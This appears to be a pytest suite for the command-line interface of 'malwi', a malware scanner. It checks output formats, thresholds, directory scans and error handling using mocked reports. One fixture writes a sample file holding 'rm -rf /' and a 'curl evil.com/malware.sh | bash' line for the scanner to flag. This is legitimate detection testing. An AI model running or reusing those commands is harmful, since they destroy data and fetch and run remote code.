"""Test basic CLI functionality end-to-end."""

import sys
import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch

# Add src to path to import from source
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from cli.entry import main
from common.config import SUPPORTED_EXTENSIONS


class TestBasicCLI:
    """End-to-end tests for basic CLI functionality"""

    def test_cli_with_simple_python_file(self, tmp_path):
        """Test CLI with a simple Python file without models"""
        # Create a simple Python file
        test_file = tmp_path / "simple.py"
        test_file.write_text("print('hello world')")

        # Mock the models to avoid loading actual ML models
        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                # Create a mock report
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                mock_obj = MalwiObject(
                    name="<module>",
                    language="python",
                    file_path=str(test_file),
                    file_source_code="print('hello world')",
                )

                mock_report = MalwiReport(
                    all_objects=[mock_obj],
                    labelled_objects=[],
                    threshold=0.7,
                    all_files=[test_file],
                    skipped_files=[],
                    processed_files=1,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(test_file),
                    start_time="2024-01-01T12:00:00",
                    duration=0.5,
                    all_file_types=[".py"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                ):
                    with patch("cli.scan.result") as mock_result:
                        main()

                        # Verify MalwiReport.create was called correctly
                        mock_process.assert_called_once_with(
                            input_path=test_file,
                            accepted_extensions=SUPPORTED_EXTENSIONS,
                            silent=True,
                            malicious_threshold=0.7,
                            on_finding=None,
                            triage=False,
                            triage_provider=None,
                            cache=None,
                            deep_analysis=False,
                            extract_attention=False,
                        )

                        # Verify result was called with demo output
                        mock_result.assert_called_once()
                        output = mock_result.call_args[0][0]
                        assert "🟢 good" in output
                        assert str(test_file) in output

    def test_cli_with_malicious_file(self, tmp_path):
        """Test CLI detecting a malicious file"""
        # Create a suspicious Python file
        test_file = tmp_path / "suspicious.py"
        test_file.write_text("""
import subprocess
import os
subprocess.call(['rm', '-rf', '/'])
os.system('curl evil.com/malware.sh | bash')
""")

        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                # Create mock malicious object
                mock_obj = MalwiObject(
                    name="<module>",
                    language="python",
                    file_path=str(test_file),
                    file_source_code=test_file.read_text(),
                )
                mock_obj.labels = {"malicious": 0.95}  # High maliciousness score

                mock_report = MalwiReport(
                    all_objects=[mock_obj],
                    labelled_objects=[mock_obj],
                    threshold=0.7,
                    all_files=[test_file],
                    skipped_files=[],
                    processed_files=1,
                    malicious=True,
                    confidence=0.95,
                    activities=["SUBPROCESS_EXECUTION", "FILESYSTEM_ACCESS"],
                    input_path=str(test_file),
                    start_time="2024-01-01T12:00:00",
                    duration=0.8,
                    all_file_types=[".py"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                ):
                    with patch("cli.scan.result") as mock_result:
                        main()

                        # Verify result shows malicious detection
                        output = mock_result.call_args[0][0]
                        assert "👹 malicious" in output
                        assert str(test_file) in output

    def test_cli_different_output_formats(self, tmp_path):
        """Test CLI with different output formats"""
        test_file = tmp_path / "test.py"
        test_file.write_text("print('test')")

        formats_to_test = ["demo", "json", "yaml", "markdown"]

        for fmt in formats_to_test:
            with patch("cli.scan.MalwiReport.load_models_into_memory"):
                with patch("cli.scan.MalwiReport.create") as mock_process:
                    from common.malwi_object import MalwiObject
                    from common.malwi_report import MalwiReport

                    mock_obj = MalwiObject(
                        name="<module>",
                        language="python",
                        file_path=str(test_file),
                        file_source_code="print('test')",
                    )

                    mock_report = MalwiReport(
                        all_objects=[mock_obj],
                        labelled_objects=[],
                        threshold=0.7,
                        all_files=[test_file],
                        skipped_files=[],
                        processed_files=1,
                        malicious=False,
                        confidence=1.0,
                        activities=[],
                        input_path=str(test_file),
                        start_time="2024-01-01T12:00:00",
                        duration=0.3,
                        all_file_types=[".py"],
                    )

                    # Mock the specific format method
                    if fmt == "json":
                        mock_report.to_json = lambda: '{"result": "good"}'
                    elif fmt == "yaml":
                        mock_report.to_yaml = lambda: "result: good"
                    elif fmt == "markdown":
                        mock_report.to_markdown = lambda: "# Good Result"
                    else:  # demo
                        mock_report.to_demo_text = lambda: "🟢 good"

                    mock_process.return_value = mock_report

                    with patch.object(
                        sys,
                        "argv",
                        ["malwi", "scan", str(test_file), "--format", fmt, "--quiet"],
                    ):
                        with patch("cli.scan.result") as mock_result:
                            main()

                            # Verify the correct format method was used
                            output = mock_result.call_args[0][0]
                            if fmt == "json":
                                assert '"result": "good"' in output
                            elif fmt == "yaml":
                                assert "result: good" in output
                            elif fmt == "markdown":
                                assert "# Good Result" in output
                            else:  # demo
                                assert "🟢 good" in output

    def test_cli_save_output_to_file(self, tmp_path):
        """Test CLI saving output to file"""
        test_file = tmp_path / "test.py"
        test_file.write_text("print('save test')")
        output_file = tmp_path / "output.json"

        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                mock_obj = MalwiObject(
                    name="<module>",
                    language="python",
                    file_path=str(test_file),
                    file_source_code="print('save test')",
                )

                mock_report = MalwiReport(
                    all_objects=[mock_obj],
                    labelled_objects=[],
                    threshold=0.7,
                    all_files=[test_file],
                    skipped_files=[],
                    processed_files=1,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(test_file),
                    start_time="2024-01-01T12:00:00",
                    duration=0.4,
                    all_file_types=[".py"],
                )
                mock_report.to_json = lambda: '{"test": "saved"}'
                mock_process.return_value = mock_report

                with patch.object(
                    sys,
                    "argv",
                    [
                        "malwi",
                        "scan",
                        str(test_file),
                        "--format",
                        "json",
                        "--save",
                        str(output_file),
                        "--quiet",
                    ],
                ):
                    with patch("cli.scan.info") as mock_info:
                        main()

                        # Verify file was saved
                        assert output_file.exists()
                        assert output_file.read_text() == '{"test": "saved"}'

                        # Verify info message about saving
                        mock_info.assert_called_with(f"Output saved to {output_file}")

    def test_cli_with_directory(self, tmp_path):
        """Test CLI scanning a directory with multiple files"""
        # Create multiple Python files
        (tmp_path / "file1.py").write_text("print('file1')")
        (tmp_path / "file2.py").write_text("import os")
        (tmp_path / "file3.js").write_text("console.log('file3')")
        (tmp_path / "readme.txt").write_text("This is a readme")  # Should be skipped

        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                # Mock objects for each processed file
                mock_objs = []
                for i, lang in enumerate(["python", "python", "javascript"]):
                    obj = MalwiObject(
                        name="<module>",
                        language=lang,
                        file_path=str(
                            tmp_path
                            / f"file{i + 1}.{'py' if lang == 'python' else 'js'}"
                        ),
                        file_source_code=f"test content {i + 1}",
                    )
                    mock_objs.append(obj)

                mock_report = MalwiReport(
                    all_objects=mock_objs,
                    labelled_objects=[],
                    threshold=0.7,
                    all_files=[
                        tmp_path / "file1.py",
                        tmp_path / "file2.py",
                        tmp_path / "file3.js",
                        tmp_path / "readme.txt",
                    ],
                    skipped_files=[tmp_path / "readme.txt"],
                    processed_files=3,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(tmp_path),
                    start_time="2024-01-01T12:00:00",
                    duration=1.2,
                    all_file_types=[".py", ".txt"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys, "argv", ["malwi", "scan", str(tmp_path), "--quiet"]
                ):
                    with patch("cli.scan.result") as mock_result:
                        main()

                        # Verify directory processing
                        mock_process.assert_called_once_with(
                            input_path=tmp_path,
                            accepted_extensions=SUPPORTED_EXTENSIONS,
                            silent=True,
                            malicious_threshold=0.7,
                            on_finding=None,
                            triage=False,
                            triage_provider=None,
                            cache=None,
                            deep_analysis=False,
                            extract_attention=False,
                        )

                        # Verify output contains directory info
                        output = mock_result.call_args[0][0]
                        assert "🟢 good" in output
                        assert str(tmp_path) in output

    def test_cli_custom_threshold(self, tmp_path):
        """Test CLI with custom maliciousness threshold"""
        test_file = tmp_path / "test.py"
        test_file.write_text("import subprocess")

        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                mock_obj = MalwiObject(
                    name="<module>",
                    language="python",
                    file_path=str(test_file),
                    file_source_code="import subprocess",
                )
                # Set maliciousness just below custom threshold
                mock_obj.labels = {"malicious": 0.85}

                mock_report = MalwiReport(
                    all_objects=[mock_obj],
                    labelled_objects=[],  # Empty because below threshold of 0.9
                    threshold=0.9,
                    all_files=[test_file],
                    skipped_files=[],
                    processed_files=1,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(test_file),
                    start_time="2024-01-01T12:00:00",
                    duration=0.6,
                    all_file_types=[".py"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys,
                    "argv",
                    ["malwi", "scan", str(test_file), "--threshold", "0.9", "--quiet"],
                ):
                    with patch("cli.scan.result") as mock_result:
                        main()

                        # Verify custom threshold was used
                        mock_process.assert_called_once_with(
                            input_path=test_file,
                            accepted_extensions=SUPPORTED_EXTENSIONS,
                            silent=True,
                            malicious_threshold=0.9,
                            on_finding=None,
                            triage=False,
                            triage_provider=None,
                            cache=None,
                            deep_analysis=False,
                            extract_attention=False,
                        )

                        # Verify result is good (below threshold)
                        output = mock_result.call_args[0][0]
                        assert "🟢 good" in output

    def test_cli_custom_extensions(self, tmp_path):
        """Test CLI with custom file extensions"""
        # Create files with different extensions
        (tmp_path / "test.py").write_text("print('python')")
        (tmp_path / "test.pyw").write_text("print('python windows')")
        (tmp_path / "test.js").write_text("console.log('js')")

        with patch("cli.scan.MalwiReport.load_models_into_memory"):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                mock_report = MalwiReport(
                    all_objects=[],
                    labelled_objects=[],
                    threshold=0.7,
                    all_files=[],
                    skipped_files=[],
                    processed_files=0,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(tmp_path),
                    start_time="2024-01-01T12:00:00",
                    duration=0.2,
                    all_file_types=[".py"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys,
                    "argv",
                    [
                        "malwi",
                        "scan",
                        str(tmp_path),
                        "--extensions",
                        "py",
                        "pyw",
                        "--quiet",
                    ],
                ):
                    with patch("cli.scan.result"):
                        main()

                        # Verify custom extensions were used
                        mock_process.assert_called_once_with(
                            input_path=tmp_path,
                            accepted_extensions=["py", "pyw"],
                            silent=True,
                            malicious_threshold=0.7,
                            on_finding=None,
                            triage=False,
                            triage_provider=None,
                            cache=None,
                            deep_analysis=False,
                            extract_attention=False,
                        )

    def test_cli_model_loading_error_continues(self, tmp_path):
        """Test CLI continues even if model loading fails"""
        test_file = tmp_path / "test.py"
        test_file.write_text("print('test')")

        # Make model loading fail
        with patch(
            "cli.scan.MalwiReport.load_models_into_memory",
            side_effect=Exception("Model loading failed"),
        ):
            with patch("cli.scan.MalwiReport.create") as mock_process:
                from common.malwi_object import MalwiObject
                from common.malwi_report import MalwiReport

                mock_obj = MalwiObject(
                    name="<module>",
                    language="python",
                    file_path=str(test_file),
                    file_source_code="print('test')",
                )

                mock_report = MalwiReport(
                    all_objects=[mock_obj],
                    labelled_objects=[],
                    threshold=0.7,
                    all_files=[test_file],
                    skipped_files=[],
                    processed_files=1,
                    malicious=False,
                    confidence=1.0,
                    activities=[],
                    input_path=str(test_file),
                    start_time="2024-01-01T12:00:00",
                    duration=0.3,
                    all_file_types=[".py"],
                )
                mock_process.return_value = mock_report

                with patch.object(
                    sys, "argv", ["malwi", "scan", str(test_file), "--quiet"]
                ):
                    with patch("cli.scan.result") as mock_result:
                        # Should not crash
                        main()

                        # Verify processing continued
                        mock_process.assert_called_once()
                        output = mock_result.call_args[0][0]
                        assert "🟢 good" in output

    def test_cli_version_flag(self, capsys):
        """Test CLI version flag"""
        with patch.object(sys, "argv", ["malwi", "--version"]):
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code == 0

        captured = capsys.readouterr()
        # Should contain version info
        assert len(captured.out) > 0
        # Version output should contain version number
        assert "v0." in captured.out or "commit" in captured.out

    def test_cli_nonexistent_file(self):
        """Test CLI with non-existent file path"""
        with patch.object(sys, "argv", ["malwi", "scan", "/nonexistent/path/file.py"]):
            # Should handle gracefully and return None
            result = main()
            assert result is None
